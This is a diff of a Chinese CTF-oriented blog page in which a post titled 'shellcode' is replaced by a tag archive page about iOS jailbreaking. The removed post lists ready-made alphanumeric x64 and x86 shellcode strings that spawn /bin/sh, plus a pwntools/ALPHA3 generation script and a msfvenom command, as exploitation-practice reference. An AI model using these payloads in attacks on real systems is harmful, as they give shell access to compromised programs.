@@ -10,7 +10,7 @@
     <meta name="description" content="null">
     
     <title>
-      shellcode - ios&#39;s blog
+      越狱问题 - ios&#39;s blog
     </title>
     <link rel="manifest" href="/manifest.json">
     <link rel="shortcut icon" href="undefined" type="image/x-icon">
@@ -61,112 +61,62 @@
           </div>
         </div>
         <div class="content">
-          <article class="post-entry">
-    <div class="header">
-      <div class="title">shellcode</div>
-      <div class="meta">
-        <span class="item">
-          <span class="iconfont icon-time-circle"></span>
-          <span>2020/03/29</span>
-        </span>
-
-        
-        
-        
-
-        
-          <span class="item leancloud-visitors" id="/2020/03/29/shellcode/" data-flag-title="shellcode">
-            <span class="iconfont icon-eye1"></span>
-            <span class="leancloud-visitors-count"></span>
-          </span>
-        
-      </div>
-      <div>
-      </div>
-    </div>
-    <h1 id="x64-shellcode"><a href="#x64-shellcode" class="headerlink" title="x64_shellcode"></a>x64_shellcode</h1><h3 id="已测试"><a href="#已测试" class="headerlink" title="已测试"></a>已测试</h3><p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-assembly"><code class="language-assembly">shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
-</code></pre>
-<h3 id="未测试"><a href="#未测试" class="headerlink" title="未测试"></a>未测试</h3><p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-assembly"><code class="language-assembly">shellcode = "PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA"
-</code></pre>
-<h3 id="ALpha3-生成-纯数字字母命令"><a href="#ALpha3-生成-纯数字字母命令" class="headerlink" title="ALpha3 生成 纯数字字母命令"></a>ALpha3 生成 纯数字字母命令</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
-s<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"sc.bin"</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>
-sh<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-s<span class="token punctuation">.</span>write<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
-s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<pre class=" language-bash"><code class="language-bash">python ./ALPHA3.py x64 ascii mixedcase rax --input<span class="token operator">=</span><span class="token string">"sc.bin"</span> <span class="token operator">></span> out.bin
-<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
-</code></pre>
-<p>相关解读文章</p>
-<p><a href="https://noonegroup.xyz/posts/8002891b/" target="_blank" rel="noopener">NoOne</a></p>
-<p><a href="https://www.jianshu.com/p/8ae8c055e35c" target="_blank" rel="noopener">使用alpha3生成alphanumeric shellcode</a></p>
-<p><a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129" target="_blank" rel="noopener"><a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129" target="_blank" rel="noopener">x64 alphanumeric shellcodeを書く</a></a></p>
-<h1 id="x86-shellcode"><a href="#x86-shellcode" class="headerlink" title="x86_shellcode"></a>x86_shellcode</h1><h3 id="未测试-1"><a href="#未测试-1" class="headerlink" title="未测试"></a>未测试</h3><pre class=" language-asm"><code class="language-asm">shellcode = "PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJTK0XZ9V2U62HFMBCMYJGRHFORSE8EP2HFO3R3YBNLIJC1BZHDHS05PS06ORB2IRNFOT3RH30PWF3MYKQXMK0AA"
-</code></pre>
-<h3 id="msf生成命令"><a href="#msf生成命令" class="headerlink" title="msf生成命令"></a>msf生成命令</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
-<pre class=" language-bash"><code class="language-bash">msfvenom -a x86 --platform linux -p linux/x86/exec CMD<span class="token operator">=</span><span class="token string">"/bin/sh"</span> -e x86/alpha_upper BufferRegister<span class="token operator">=</span>eax
-</code></pre>
-<p>相关解读</p>
-<p><a href="https://xz.aliyun.com/t/6645" target="_blank" rel="noopener">shellcode 的艺术</a></p>
-
-
-  
-
-  
-    <div class="post-reward">
-      <div id="reward-button">请杯咖啡呗~</div>
-      <div id="qr">
-        <div class="wrap">
-            
-            <div class="bg-wrap">
-              <a href="/images/zhifubao.png" target="_block" class="bg" style="background-image:url('/images/zhifubao.png')"></a>
-              支付宝
-            </div>
-            
-            
-            <div class="bg-wrap">
-                <a href="/images/weixin.png" target="_block" class="bg" style="background-image:url('/images/weixin.png')"></a>
-              微信
-            </div>
-            
+          <div class="archives">
+    
+     
+        <div class="header">
+        <span class="iconfont icon-tag1"></span>
+        <div class="explain">
+            越狱问题
         </div>
-      </div>
+        </div>
+    
+
+
+
+
+
+
+<section class="wrap">
+    <div class="meta">
+        <a href="/archives/2020" class="archive-meta">
+            2020
+        </a>
     </div>
+    <div class="year">
+        
+        <article class="item">
+            
+            
+            <div class="content">
+                <div class="title">
+                    <a href="/2020/02/29/ios逆向入门笔记-基本工作/">
+                        ios逆向入门笔记-基本工作
+                    </a>
+                </div>
+                <div class="meta">
+                    <span class="meta-item">
+                        <span class="iconfont icon-time-circle"></span>
+                        <span>2020/02/29</span>
+                    </span>
+                    
+
+                    
+                </div>
+            </div>
+        </article>
+        
+        
+    </div>
+</section>
+
   
-  
-  <div class="post-guide">
-    <div class="item left">
-        
-          <a href="2020/05/05/vcpkg-MacOS10-15-安装问题/"><span class="iconfont icon-left"></span>vcpkg-MacOS10.15-安装问题</a>
-        
-    </div>
-    <div class="item right">
-        
-          <a href="2020/02/29/ios逆向入门笔记-基本工作/">ios逆向入门笔记-基本工作<span class="iconfont icon-right"></span></a>
-        
-    </div>
+
+  <div class="paginator">
+        <span class="page-number current">1</span>
   </div>
+</div>
 
-  
-
-  <div class="post-copyright">
-    <div class="auth">
-      本文作者：<a href="http://iosmosis.github.io">ios</a>
-    </div>
-    <div class="link">
-      永久链接：<a href="http://iosmosis.github.io/2020/03/29/shellcode/">http://iosmosis.github.io/2020/03/29/shellcode/</a>
-    </div>
-    <div class="declare">
-      版权声明：本文首发于<a href="http://iosmosis.github.io">ios</a>的博客，转载请注明出处！
-    </div>
-  </div>
-
-  <div id="comment"></div>
-</article>
         </div>
         <footer>
           <div class="copyright">
@@ -217,16 +167,7 @@ s<span class="token punctuation">.</span>close<span class="token punctuation">(<
               <a href="/tags/AI外挂/" style="font-size: 14px; color: #4a4a4a">AI外挂</a> <a href="/tags/About-Me/" style="font-size: 14px; color: #4a4a4a">About Me</a> <a href="/tags/BUPT/" style="font-size: 14px; color: #4a4a4a">BUPT</a> <a href="/tags/CTFwiki/" style="font-size: 14px; color: #4a4a4a">CTFwiki</a> <a href="/tags/Fastbin-Attack/" style="font-size: 16px; color: #4a4a4a">Fastbin_Attack</a> <a href="/tags/Getshell/" style="font-size: 14px; color: #4a4a4a">Getshell</a> <a href="/tags/Heap/" style="font-size: 16px; color: #4a4a4a">Heap</a> <a href="/tags/Hexo/" style="font-size: 14px; color: #4a4a4a">Hexo</a> <a href="/tags/Jarvis-OJ/" style="font-size: 14px; color: #4a4a4a">Jarvis OJ</a> <a href="/tags/MISC/" style="font-size: 14px; color: #4a4a4a">MISC</a> <a href="/tags/NPUCTF/" style="font-size: 14px; color: #4a4a4a">NPUCTF</a> <a href="/tags/Pwn/" style="font-size: 20px; color: #4a4a4a">Pwn</a> <a href="/tags/RE/" style="font-size: 18px; color: #4a4a4a">RE</a> <a href="/tags/ROP/" style="font-size: 14px; color: #4a4a4a">ROP</a> <a href="/tags/ROPgadget/" style="font-size: 14px; color: #4a4a4a">ROPgadget</a>
             </div>
           </div>
-           
-          <div class="toc-widget">
-            <div class="title">
-              <span>Toc</span>
-            </div>
-            <div class="post-toc">
-              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#x64-shellcode"><span class="toc-text">x64_shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#已测试"><span class="toc-text">已测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#未测试"><span class="toc-text">未测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ALpha3-生成-纯数字字母命令"><span class="toc-text">ALpha3 生成 纯数字字母命令</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#x86-shellcode"><span class="toc-text">x86_shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#未测试-1"><span class="toc-text">未测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf生成命令"><span class="toc-text">msf生成命令</span></a></li></ol></li>
-            </div>
-          </div>
-           
+          
         </div>
         
       </div>
